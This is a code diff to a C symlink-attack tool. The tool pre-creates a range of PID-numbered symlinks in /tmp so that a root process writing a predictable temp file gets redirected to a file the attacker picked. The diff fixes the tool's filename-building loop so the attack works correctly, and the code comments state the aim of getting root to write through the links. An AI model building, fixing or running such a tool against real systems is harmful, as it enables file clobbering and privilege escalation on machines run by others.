@@ -6,6 +6,7 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <dirent.h>
+#include <strings.h>
 
 /*
 #Symlink creator to abuse files creation in /tmp where the pid is used in the filename.  
@@ -40,7 +41,7 @@ int
 main (int argc, char **argv)
 {
   int x = 0, from = 0, errflg = 0, to = 0, result = 0, i = 0, pid = 0, ch = 0;
-  char dest_name[MAXSIZE], from_name[MAXSIZE], start_time[26];
+  char dest_name[MAXSIZE], from_name[MAXSIZE],tmp_name[MAXSIZE], start_time[26];
   struct stat buf;
   files *file_list, *tmp, *start;
   time_t t_time_watch, t_time;
@@ -104,20 +105,21 @@ main (int argc, char **argv)
   //Create our block of symlinks that we hope root will write too.
   for (x = from; x < to; x++)
     {
-      sprintf (from_name, "%s%d", from_name, x);
-      printf ("Symlinking %s->%s\n", from_name, dest_name);
+      sprintf (tmp_name, "%s%d", from_name, x);
+      printf ("Symlinking %s->%s\n", tmp_name, dest_name);
       tmp = malloc (sizeof (files));
-      strcpy (tmp->filename, from_name);
+      strcpy (tmp->filename, tmp_name);
       tmp->next = file_list->next;
       file_list->next = tmp;
 
-      result = symlink (dest_name, from_name);
+      result = symlink (dest_name, tmp_name);
 
       if (result < 0)
 	{
 	  printf ("Error: %d, %s\n", result, strerror (errno));
 	  return (-1);
 	}
+    // bzero(from_name,256);
     }
 
 
